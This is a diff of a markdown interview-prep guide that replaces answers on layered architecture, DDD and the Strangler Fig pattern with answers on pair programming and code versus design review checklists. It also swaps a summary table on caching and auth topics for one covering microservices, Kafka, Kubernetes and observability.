+Every 25-30 minutes: switch roles
 ```
 
 **Benefits:**
-- Separation of concerns — easy to test each layer in isolation.
-- Business logic is independent of HTTP framework or DB technology.
-- Can swap DB (Postgres → MongoDB) by only changing the repository layer.
 
-> 📖 Reference: [Layered Architecture — O'Reilly](https://www.oreilly.com/library/view/software-architecture-patterns/9781491971437/ch01.html)
+```
+1. Knowledge sharing: navigator learns how driver thinks; both learn the codebase together
+   → New team member paired with senior → onboards 3x faster
+
+2. Fewer bugs: "two sets of eyes" catches errors in real-time
+   → Studies show 15-20% fewer defects than solo coding
+   → Cheaper than code review catching bugs after the fact
+
+3. Better design: discussing trade-offs out loud reveals assumptions
+   → "Why did you use a HashMap here?" → "Oh, a Set would be better actually"
+
+4. Code review built-in: navigator reviews as driver writes
+   → Pair-programmed code often doesn't need a separate PR review
+
+5. Bus factor: two people understand the same code
+   → One person on vacation? The other knows the code
+```
+
+**When NOT to use it:**
+
+```
+❌ Exploratory/research work: need to read docs, experiment, prototype alone
+   → Better: spike solo, then pair to implement
+
+❌ Simple/repetitive tasks: writing boilerplate, copy-paste refactoring
+   → Pairing adds overhead without proportional benefit
+
+❌ Mismatched skill level with no intent to teach
+   → If senior does all the work while junior watches → not real pairing
+
+❌ Different timezones / async environments
+   → Remote async pairing is harder; use async code review instead
+
+❌ When one person is fatigued or has context-switching issues
+   → 4-6 hours of deep pairing per day is the max for most people
+```
+
+> 📖 Reference: [Pair Programming — Martin Fowler](https://martinfowler.com/articles/on-pair-programming.html)
 
 ---
 
-**Q59. What is Domain-Driven Design (DDD)? What is a bounded context?**
+**Q60. What is the difference between a code review and a design review? What do you look for in each?**
 
 **Answer:**
 
-**Domain-Driven Design (DDD)** is an approach to software design that centers the model around the **business domain** — focusing on understanding and modeling the real-world problem space.
+| | Code Review | Design Review |
+|--|------------|--------------|
+| When | After code is written (PR review) | Before coding begins |
+| Focus | Implementation correctness, quality | Architecture, approach, trade-offs |
+| Artifact | Code diff (PR) | Design doc, diagram, RFC |
+| Scope | Module/feature level | System/cross-service level |
+| Goal | Catch bugs, enforce standards, share knowledge | Align on approach, catch design flaws early |
+| Cost to change | Low (change the code) | Low (change the document) |
 
-**Core concepts:**
-
-```
-Domain: The problem space (e-commerce, banking, healthcare)
-Model:  Software representation of domain concepts
-
-Key building blocks:
-- Entity:        Object with identity that persists over time (User, Order)
-- Value Object:  Immutable object defined by its attributes (Money, Address)
-- Aggregate:     Cluster of entities/VOs treated as a single unit (Order + OrderItems)
-- Repository:    Abstracts persistence for aggregates
-- Domain Service: Business logic not belonging to a single entity
-- Domain Event:  Something significant that happened in the domain
-```
-
-**Bounded Context — the most important concept:**
+**Code Review checklist:**
 
 ```
-A Bounded Context defines the boundary within which a domain model is valid and consistent.
-The same word can mean different things in different bounded contexts.
+Correctness:
+✅ Does it do what the PR description says?
+✅ Are edge cases handled? (null, empty, max values, concurrent access)
+✅ Are errors handled and returned properly?
+✅ Is there no obvious N+1 query issue?
 
-E-commerce example:
+Security:
+✅ Is user input validated and sanitized?
+✅ Are SQL queries parameterized?
+✅ Is authorization checked for every sensitive operation?
+✅ Are secrets not hardcoded?
 
-┌────────────────────────┐  ┌──────────────────────────┐  ┌─────────────────────────┐
-│   Order Context        │  │  Inventory Context        │  │  Shipping Context        │
-│                        │  │                           │  │                          │
-│  "Product" =           │  │  "Product" =              │  │  "Product" =             │
-│  name, price, image    │  │  SKU, warehouse loc, qty  │  │  weight, dimensions      │
-│                        │  │                           │  │                          │
-│  "Customer" =          │  │  (no customer concept)    │  │  "Customer" =            │
-│  profile, order history│  │                           │  │  shipping address only   │
-└────────────────────────┘  └──────────────────────────┘  └─────────────────────────┘
+Quality:
+✅ Are functions single-purpose and reasonably sized?
+✅ Is the naming clear and consistent?
+✅ Is there adequate test coverage for new/changed logic?
+✅ Is there unnecessary code or dead code?
+✅ Can I understand what it does without reading every line?
+
+Operational:
+✅ Are important events logged?
+✅ Are metrics/traces emitted for new code paths?
+✅ Is the migration backward-compatible?
 ```
 
-**Code example:**
-
-```js
-// Order Context (Order Aggregate)
-class Order {
-  constructor(id, customerId) {
-    this.id = id;
-    this.customerId = customerId;
-    this.items = [];
-    this.status = 'draft';
-    this.domainEvents = [];
-  }
-
-  addItem(productId, productName, price, quantity) {
-    // Business rule: can only add items to draft orders
-    if (this.status !== 'draft') {
-      throw new Error('Cannot add items to a non-draft order');
-    }
-    this.items.push(new OrderItem(productId, productName, price, quantity));
-  }
-
-  place() {
-    // Business rule: must have at least one item
-    if (this.items.length === 0) throw new Error('Order must have items');
-
-    this.status = 'placed';
-    this.placedAt = new Date();
-
-    // Raise domain event — other contexts listen to this
-    this.domainEvents.push(new OrderPlaced({
-      orderId:    this.id,
-      customerId: this.customerId,
-      total:      this.calculateTotal(),
-      items:      this.items
-    }));
-  }
-
-  calculateTotal() {
-    return this.items.reduce((sum, item) => sum + item.subtotal, 0);
-  }
-}
-
-// Value Object — immutable, no identity
-class Money {
-  constructor(amount, currency) {
-    if (amount < 0) throw new Error('Amount cannot be negative');
-    this.amount   = amount;
-    this.currency = currency;
-    Object.freeze(this); // immutable
-  }
-
-  add(other) {
-    if (this.currency !== other.currency) throw new Error('Currency mismatch');
-    return new Money(this.amount + other.amount, this.currency);
-  }
-}
-```
-
-> 📖 Reference: [DDD — Martin Fowler](https://martinfowler.com/bliki/DomainDrivenDesign.html)
-
----
-
-**Q60. What is the Strangler Fig pattern? How is it used to migrate a monolith to microservices?**
-
-**Answer:**
-
-The **Strangler Fig** pattern (named after a fig tree that grows around a host tree and eventually replaces it) incrementally replaces a legacy system by routing traffic to new services one feature at a time — until the old system can be safely retired.
+**Design Review checklist:**
 
 ```
-Phase 1: Monolith handles everything
-  Client → [Monolith: users, orders, products, payments, notifications]
+Correctness:
+✅ Does the design achieve the stated goals?
+✅ Are all edge cases and failure modes considered?
+✅ Is the consistency model appropriate?
 
-Phase 2: Extract one service, route selectively
-  Client → [Router/Proxy] → [User Service]  (new!)
-                           → [Monolith]     (users removed, rest stays)
+Architecture:
+✅ Does it fit the existing architecture patterns?
+✅ Are service responsibilities clearly bounded?
+✅ Is there unnecessary coupling between components?
+✅ Are there simpler alternatives that achieve the same goal?
 
-Phase 3: Extract another
-  Client → [Router/Proxy] → [User Service]
-                           → [Order Service] (new!)
-                           → [Monolith]      (users + orders removed)
+Operations:
+✅ How will this be monitored and debugged in production?
+✅ How does it handle failure of dependent services?
+✅ Is the data migration strategy safe (zero-downtime)?
+✅ What is the rollback plan?
 
-Phase N: Monolith is empty → retire it
-  Client → [Router/Proxy] → [User Service]
-                           → [Order Service]
-                           → [Product Service]
-                           → [Payment Service]
+Performance:
+✅ What are the expected throughput and latency characteristics?
+✅ Does the design hold up at 10x current scale?
+✅ Are there potential bottlenecks?
+
+Trade-offs:
+✅ What are the explicit trade-offs made? (consistency vs availability, etc.)
+✅ Are there significant technical debts incurred? If so, are they tracked?
 ```
 
-**Implementation with a proxy/API gateway:**
-
-```js
-// ── Phase 1: Facade (proxy) in front of monolith ──────────────────────
-const proxy = require('express-http-proxy');
-const express = require('express');
-const app = express();
-
-// ✅ New User Service handling /users (strangled from monolith)
-app.use('/api/users', proxy('http://user-service.internal:3001'));
-
-// ✅ New Order Service (recently extracted)
-app.use('/api/orders', proxy('http://order-service.internal:3002'));
-
-// ❌ Everything else still goes to monolith
-app.use('/', proxy('http://monolith.internal:8080'));
-
-// As each service is extracted, update these routes
-// When monolith is empty, remove the last catch-all
-
-// ── Database migration strategy ───────────────────────────────────────
-// Phase 1: New service writes to BOTH new DB and monolith DB
-// Phase 2: Verify data in both DBs match
-// Phase 3: New service reads from new DB, writes to both (dual write)
-// Phase 4: Remove dual write — new service only uses its own DB
-
-// ── Feature flag for gradual cutover ─────────────────────────────────
-app.use('/api/users', async (req, res, next) => {
-  const useNewService = await featureFlag.isEnabled('use-user-service', req.user?.id);
-
-  if (useNewService) {
-    return proxy('http://user-service.internal:3001')(req, res, next);
-  } else {
-    return proxy('http://monolith.internal:8080')(req, res, next); // legacy
-  }
-});
-// Roll out to 5% → 25% → 50% → 100% of users
-// Roll back instantly if issues found
-```
-
-**Why it's better than "big bang rewrite":**
-- System stays live throughout migration.
-- Problems found early (5% of users, not all).
-- Business gets new service value incrementally.
-- Risk is limited to one service at a time.
-- Can pause or revert at any point.
-
-> 📖 Reference: [Strangler Fig Pattern — Martin Fowler](https://martinfowler.com/bliki/StranglerFigApplication.html)
+> 📖 Reference: [Code Review Best Practices — Google Engineering](https://google.github.io/eng-practices/review/)
 
 ---
 
@@ -4638,58 +4829,66 @@ app.use('/api/users', async (req, res, next) => {
 
 | # | Topic | Key Point |
 |---|-------|-----------|
-| Q1 | Caching | Solves speed + DB load; memory (~0.1ms) vs DB (~50ms) |
-| Q2 | Cache types | In-memory=process-local; Redis=distributed; CDN=edge |
-| Q3 | Cache-Aside | App checks cache → miss → query DB → store. Manual invalidation |
-| Q4 | Write-Through vs Write-Behind | Write-Through=sync DB+cache; Write-Behind=write cache, async DB |
-| Q5 | Eviction policies | LRU=least recently used; LFU=least frequently; FIFO=oldest first |
-| Q6 | Cache stampede | Mass cache miss → DB overload; fix with mutex lock or early refresh |
-| Q7 | Cache invalidation | Hardest problem; strategies: TTL, event-based, cache tags |
-| Q8 | Redis beyond cache | Sessions, rate limiting, pub/sub, leaderboards (sorted sets), locks |
-| Q9 | TTL | Set based on: change frequency × staleness tolerance × query cost |
-| Q10 | JWT storage | localStorage=XSS risk; HttpOnly cookie=CSRF risk; cookie+SameSite=best |
-| Q11 | Silent refresh | Short access token (15m) + long refresh token (30d) + axios interceptor |
-| Q12 | JWT revocation | Hard because stateless; workaround: blocklist in Redis or version number |
-| Q13 | OAuth Auth Code Flow | Browser redirects → auth server → code → backend exchanges for token |
-| Q14 | PKCE | Prevents code interception; verifier sent at token exchange, not before |
-| Q15 | OAuth vs OIDC | OAuth=authorization (can you access X?); OIDC=authentication (who are you?) |
-| Q16 | RBAC | Roles have permissions; users have roles; check permission in middleware |
-| Q17 | Composite index | Multi-column index; left-prefix rule; equality columns first |
-| Q18 | Covering index | All needed columns in index → no heap lookup → Index Only Scan |
-| Q19 | Full-text search | tsvector + GIN index; ranked results; handles stemming unlike LIKE |
-| Q20 | DB query cache | MySQL removed it; use application-level Redis cache instead |
-| Q21 | DB deadlock | Circular lock wait; prevent with consistent lock ordering + retry |
-| Q22 | Clustered index | IS the table (primary key); 1 per table; rows physically ordered |
-| Q23 | Slow query detection | pg_stat_statements + EXPLAIN ANALYZE + slow query log |
-| Q24 | Partitioning | Horizontal=split rows by key; Vertical=split columns by access pattern |
-| Q25 | Containers vs VMs | Containers share kernel; faster, lighter; VMs fully isolated |
-| Q26 | Dockerfile | FROM, RUN, COPY, CMD, EXPOSE, ENV; copy package.json before source for cache |
-| Q27 | Image vs Container | Image=blueprint (immutable); Container=running instance; Registry=storage |
-| Q28 | Docker Compose | Multi-container dev env; single docker-compose.yml; one command to start all |
-| Q29 | Multi-stage build | Build in heavy image; copy artifacts to slim final image; 1.2GB → 180MB |
-| Q30 | Volumes vs Bind Mounts | Volume=Docker-managed (data); Bind=host path (dev hot-reload) |
-| Q31 | Docker networking | Containers on same network talk by name; compose creates default network |
-| Q32 | Background jobs | Async tasks outside request cycle; email, image resize, invoice generation |
-| Q33 | Message vs Task Queue | Message queue=transport; Task queue=job execution with retry/scheduling |
-| Q34 | Delivery guarantees | At-most-once=may lose; At-least-once=may duplicate; Exactly-once=hard |
-| Q35 | DLQ | Failed messages after max retries; prevents loss; inspect + replay |
-| Q36 | Job idempotency | Safe to run N times; use deduplication key, upsert, status check |
-| Q37 | Cron vs Event-driven | Cron=time-based (billing); Event=immediate reaction (signup email) |
-| Q38 | GraphQL | Client specifies exact fields; solves over-fetching and under-fetching |
-| Q39 | gRPC | Binary Protobuf over HTTP/2; 5-10x faster than REST; for internal services |
-| Q40 | BFF | Dedicated backend per frontend type; mobile gets lean API, web gets rich API |
-| Q43 | NoSQL types | Document, Key-Value, Column-Family, Graph; each for different data patterns |
-| Q46 | Eventual consistency | Replicas sync eventually; low latency; staleness acceptable for many use cases |
-| Q47 | CAP theorem | CP=consistent during partition; AP=available during partition; choose wisely |
-| Q48 | OWASP Top 10 | Broken Access Control, Injection, Crypto Failures, SSRF among top 5 |
-| Q49 | Security headers | CSP (XSS), HSTS (HTTPS), X-Frame-Options (clickjacking), X-Content-Type |
-| Q50 | Least privilege | Minimal permissions; DB user can't DROP; IAM role scoped to one bucket |
-| Q53 | Latency vs Throughput | Latency=single request time; Throughput=requests per second |
-| Q54 | Load balancer | Round-Robin=sequential; Least-Connections=route to least busy |
-| Q56 | Read replica | Read-heavy queries → replica; writes → primary; watch for replication lag |
-| Q58 | Layered Architecture | Routes → Controllers → Services → Repositories → DB |
-| Q59 | DDD | Domain model + bounded contexts; same term means different things per context |
-| Q60 | Strangler Fig | Migrate monolith piece by piece; proxy routes traffic; no big bang rewrite |
+| Q1 | Microservices vs Monolith | Micro=independently deployable, DB per service; Mono=simple, all-or-nothing |
+| Q2 | Microservices trade-offs | Benefits: scale/deploy independently; Costs: network latency, distributed data, ops overhead |
+| Q3 | Service discovery | Client-side=app queries registry; Server-side=LB queries registry (Kubernetes default) |
+| Q4 | API Gateway | Single entry point; handles auth, rate limiting, routing, SSL termination, logging |
+| Q5 | Inter-service communication | Sync=REST/gRPC (wait for response); Async=Kafka/queues (fire and forget) |
+| Q6 | Circuit Breaker | CLOSED→OPEN after N failures; fail-fast when OPEN; HALF-OPEN to test recovery |
+| Q7 | Saga pattern | Orchestration=central coordinator; Choreography=event-driven, each service reacts |
+| Q8 | Outbox pattern | Write to DB + outbox in ONE transaction; relay publishes outbox to Kafka |
+| Q9 | Distributed transactions | Impossible without 2PC (which blocks); use Sagas + eventual consistency instead |
+| Q10 | Sidecar pattern | Helper container in same pod; handles logging, proxying, TLS without changing app |
+| Q11 | Kafka vs RabbitMQ | Kafka=log-based, retain, replay, multiple independent consumers; RabbitMQ=message queue, delete after ACK |
+| Q12 | Kafka partitions | Topic=N partitions; 1 consumer per partition in a group; more partitions=more parallelism |
+| Q13 | Queue vs Pub/Sub | Queue=one consumer gets msg; Pub/Sub=ALL subscribers get msg |
+| Q14 | Event-driven arch | Loose coupling, resilient, scalable; challenges: eventual consistency, debugging |
+| Q15 | Event Sourcing | Store events not state; replay events to rebuild state; full audit trail |
+| Q16 | CQRS | Separate write model (commands) from read model (queries); different data stores optimized per use case |
+| Q17 | Kafka consumer lag | End offset - committed offset; fix by adding consumers (≤ partition count) or batching |
+| Q18 | CI pipeline | Lint→Typecheck→Unit Tests→Integration Tests→Security Audit→Build→Docker Build |
+| Q19 | CD vs CDP | Delivery=manual prod approval; Deployment=auto-deploy to prod if tests pass |
+| Q20 | Blue-green | Two identical envs; instant traffic switch; instant rollback; 2x infra cost |
+| Q21 | Canary | Gradual rollout (5%→25%→50%→100%); real user validation; small blast radius |
+| Q22 | Feature flags | Deploy code with flag OFF; enable gradually; rollback instantly without redeploy |
+| Q23 | IaC | Infrastructure defined as code; reproducible, versioned, automated; Terraform, CDK |
+| Q24 | Rollback strategy | K8s: `kubectl rollout undo`; Blue-green: switch LB; DB: expand-contract migrations |
+| Q25 | Kubernetes | Orchestrates containers across cluster; self-healing, autoscaling, service discovery |
+| Q26 | Pod/Deployment/Service | Pod=container(s); Deployment=manages pods; Service=stable endpoint to pods |
+| Q27 | ConfigMap vs Secret | ConfigMap=non-sensitive config; Secret=base64 credentials (use external secrets in prod) |
+| Q28 | HPA | Auto-scales pod count based on CPU/memory/custom metrics |
+| Q29 | Liveness vs Readiness | Liveness=is it alive? (restart if not); Readiness=is it ready for traffic? (remove from LB if not) |
+| Q30 | Namespaces | Virtual cluster within K8s; isolate by env or team; resource quotas per namespace |
+| Q31 | Sharding | Split rows across multiple DB servers by shard key; range/hash/directory strategies |
+| Q32 | Replication | Primary handles writes, replicas serve reads; WAL streamed from primary to replicas |
+| Q33 | WAL | Changes written to WAL before data files; ensures durability + enables replication |
+| Q34 | Sync vs Async replication | Sync=zero data loss, higher latency; Async=faster writes, potential data loss on failure |
+| Q35 | Time-series DB | Optimized for timestamp-indexed data; auto-downsampling, compression; InfluxDB, TimescaleDB |
+| Q36 | Two Generals | Proves reliable consensus over unreliable network is impossible; design for idempotency |
+| Q37 | Distributed lock | Redis SET NX EX; Lua for atomic release; use Redlock for multi-node |
+| Q38 | Consistent hashing | Keys distributed on ring; adding/removing nodes remaps ~1/N keys (not all) |
+| Q39 | Quorum | W + R > N ensures consistency; Cassandra ONE=fastest, QUORUM=balanced, ALL=strictest |
+| Q40 | Async distributed system | Real networks are async; timeout≠failure; design idempotent retries |
+| Q41 | Three pillars | Logs=what happened; Metrics=how many/fast; Traces=where in which service |
+| Q42 | Distributed tracing | Trace=full journey; Span=one operation; propagated via headers (W3C traceparent) |
+| Q43 | Prometheus | Pull-based metrics scraping; PromQL for queries; rate(), histogram_quantile() |
+| Q44 | Grafana | Visualization layer over Prometheus; dashboards, alerts, multi-source correlation |
+| Q45 | SLI/SLO/SLA | SLI=measured value; SLO=internal target; SLA=external contract with consequences |
+| Q46 | Alert fatigue | Too many non-actionable alerts; fix: alert on symptoms, require runbook, sustained duration |
+| Q47 | API backward compat | Expand-contract: add new + keep old → migrate → remove old; add Deprecation header |
+| Q48 | Long polling/SSE/WS | Long polling=re-request loop; SSE=server push (HTTP); WebSocket=bidirectional TCP |
+| Q49 | Contract testing | Consumer defines expectations; provider verifies; Pact Broker stores contracts |
+| Q50 | OpenAPI/Swagger | Machine-readable API spec; auto-generates docs, SDKs, validation middleware |
+| Q51 | IaaS/PaaS/SaaS | IaaS=manage OS+app; PaaS=just deploy app; SaaS=just configure |
+| Q52 | Object/Block/File storage | Object=S3 HTTP flat; Block=EBS disk; File=EFS shared filesystem |
+| Q53 | CDN | Cache at edge globally; reduce latency 10-25x; offload origin; DDoS protection |
+| Q54 | Auto-scaling | Scheduled=time-based (predictable); Dynamic=metric-based (reactive to load) |
+| Q55 | VPC | Private cloud network; public subnet for LB; private subnets for app+DB; no internet to DB |
+| Q56 | Blameless post-mortem | Timeline + root cause + contributing factors + action items; blame system not people |
+| Q57 | Technical debt | Frame as business impact: velocity/risk/cost; track as tickets; schedule paydown |
+| Q58 | ADR | Decision + context + alternatives considered + consequences; audit trail for "why" |
+| Q59 | Pair programming | Driver writes, navigator guides; benefits: knowledge sharing, fewer bugs; not for all tasks |
+| Q60 | Code vs Design review | Code=implementation correctness; Design=architecture alignment before coding begins |
 
 ---
 
@@ -4697,7 +4896,7 @@ app.use('/api/users', async (req, res, next) => {
 
 Found a better explanation or a cleaner code example?
 - Fork the repo, update the answer, open a PR.
-- PR title format: `[Solution-Day-03] Improve answer for Q6`
+- PR title format: `[Solution-Day-04] Improve answer for Q6`
 
 ---
 
